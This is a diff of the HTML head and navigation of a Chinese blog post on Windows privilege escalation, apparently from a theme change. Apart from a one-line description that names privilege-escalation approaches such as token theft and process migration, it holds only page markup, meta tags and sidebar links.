@@ -1,492 +1,193 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
 
+<!DOCTYPE html><html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="keywords" content="Windows提权学习一, hybcx&#39;s blog">
-    <meta name="description" content="0x01 基础知识
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
+  
+  <meta name="generator" content="Hexo 7.2.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  
+  <title>Windows提权学习一 - hybcx's blog</title>
 
-提权的思路最重要的就是信息收集,我们只有对整个系统进行了较全面的信息收集,大概对整个系统有了一定的了解后,我们才能高效且精准的完成提权
-比方说:我们收集到这个系统是windows-sever2003的系统和里面的一些相">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  
+    <meta name="description" content="0x01 基础知识  提权的思路最重要的就是信息收集,我们只有对整个系统进行了较全面的信息收集,大概对整个系统有了一定的了解后,我们才能高效且精准的完成提权 比方说:我们收集到这个系统是windows-sever2003的系统和里面的一些相关配置我们能联想到什么提权方法呢? 是不是可以先利用自动化工具(msf和cs)先去尝试–&gt;针对低版本的系统命令–&gt;进程迁移–&gt;令牌窃取–&amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权学习一">
+<meta property="og:url" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/index.html">
+<meta property="og:site_name" content="hybcx&#39;s blog">
+<meta property="og:description" content="0x01 基础知识  提权的思路最重要的就是信息收集,我们只有对整个系统进行了较全面的信息收集,大概对整个系统有了一定的了解后,我们才能高效且精准的完成提权 比方说:我们收集到这个系统是windows-sever2003的系统和里面的一些相关配置我们能联想到什么提权方法呢? 是不是可以先利用自动化工具(msf和cs)先去尝试–&gt;针对低版本的系统命令–&gt;进程迁移–&gt;令牌窃取–&amp;gt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230919220245012-1695132165630-1.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230919220312677.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921161056911.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230920214726283.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921183511118.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921202649678.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921203114154.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921203048925.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921203210416.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921203245580-1695299566148-5.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921203352142-1695299632698-7.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921203447168.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921204604770-1695300365102-9.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921210646280-1695301606818-11.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921213244700.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921212009290.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921215222058.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921215307071.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230921220546766.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923115030829.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923115212928.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923115348418.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923115657230.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923115758614.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923151615440.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923151735814.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923151951899.png">
+<meta property="og:image" content="https://image.3001.net/images/20200822/1598030068.png!small">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/1598030526.jpeg">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/1598030572.jpeg">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923152311550.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923152443724.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923152903133.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923152958820.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923153048834.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923153127662.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923153210695.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923153356455.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923153835677.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923153945706.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230923154053979.png">
+<meta property="article:published_time" content="2023-09-19T13:06:56.871Z">
+<meta property="article:modified_time" content="2023-09-25T11:22:54.312Z">
+<meta property="article:author" content="hybcx">
+<meta property="article:tag" content="Windows 提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hybcx.xyz/2023/09/19/windows-ti-quan-xue-xi-yi/image-20230919220245012-1695132165630-1.png">
+  
+  
+  
+  <meta name="keywords" content="Windows 提权">
 
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.28.1">
+
+  
+
+  
     
-      gtag('config', 'G-BYTY196ENH');
-    </script>
+<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
 
+  
 
-    <title>Windows提权学习一 | hybcx&#39;s blog</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-    
+  <script>
+  if (window.localStorage.getItem('ZYI_Theme_Mode')==='dark' || (window.localStorage.getItem('ZYI_Theme_Mode')==='Moss' && window.matchMedia('(prefers-color-scheme: dark)').matches)){
+      document.querySelector("html").id = "ZYDark";
+  }
+</script>
+<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/custom/css/ZYDark.css">
 
-
-    <!-- bg-cover style     -->
-
-
-
-<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-<link rel="stylesheet" type="text/css" href="/css/matery.css">
-<link rel="stylesheet" type="text/css" href="/css/my.css">
-<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
-
-
-
-
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-    <link rel="stylesheet" href="/css/post.css">
-
-
-
-
-    
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
-
-
-
-    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
-
-<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 <body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
-                </a>
-            </div>
-            
 
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-  <li>
-    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
-      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
 
 
-<div id="mobile-nav" class="side-nav sidenav">
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/logo.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 奈何却无能</div></a></div></header>
 
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">hybcx&#39;s blog</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
-    </div>
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
-    </ul>
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
 </div>
+<div class="widgets">
 
 
-        </div>
-
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
-        
-    </nav>
-
-</header>
-
-    
-
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">Windows提权学习一</h1>
-                </div>
-            </div>
-        </div>
-    </div>
+<widget class="widget-wrapper slide-up post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">浅析SSTI漏洞</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PIN码学习</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/04/15/uuctf-2022/"><span class="title">UUCTF_2022</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a></div></widget>
 </div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 